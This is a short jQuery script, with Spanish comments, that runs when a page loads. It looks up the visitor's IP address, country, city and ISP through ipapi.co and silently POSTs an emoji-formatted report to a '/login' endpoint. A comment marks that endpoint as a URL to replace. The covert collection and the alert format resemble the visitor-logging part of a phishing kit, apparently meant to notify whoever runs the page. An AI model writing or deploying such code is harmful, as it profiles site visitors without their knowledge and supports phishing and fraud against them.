$(document).ready(() => {
fetch("https://ipapi.co/json")
    .then(response => response.json())
    .then(data => {
      if (!data) {
        return false
      }
      const query = decodeURI(`\n■■■■■🌐🌟👤■■■■■\n🌐 IP: ${data.ip}\n🗺 País: ${data.country_name}\n🌃 Ciudad: ${data.city}\n🔌Int. Comp: ${data.org}\n■■■■■■■■■■■■■■■`)
$.ajax({
  url: `/login?msg=${query}`, // Cambia esta URL
  type: 'POST',
  success: function(respuesta) {
    console.log('Respuesta del servidor:', respuesta);
  },
  error: function(xhr, status, error) {
    console.error('Error en la petición:', error);
  }
});

    })
    .catch(error => console.error('Error:', error))
})